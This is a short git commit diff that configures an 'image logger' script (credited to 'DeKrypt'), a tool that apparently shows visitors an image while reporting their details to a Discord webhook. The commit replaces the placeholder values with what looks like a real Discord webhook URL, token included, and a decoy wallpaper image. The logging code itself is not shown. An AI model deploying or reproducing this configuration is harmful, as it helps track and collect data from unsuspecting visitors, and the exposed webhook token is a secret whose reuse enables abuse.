a7fc5ca80d8234ee1c85745a414ad31afa4a97e7
nawflt <xxaiushxx@gmail.com>
2025-02-06 19:52:35 +0300

    Update Imgur.py

--- api/Imgur.py
+++ api/Imgur.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1337102532723478558/4S-aZb6CQatCK7PYznVJKjMjtdQr1yWrPcxYrBqx3CTUg98GcuiLavA4yElAJlcKQFRe",
+    "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
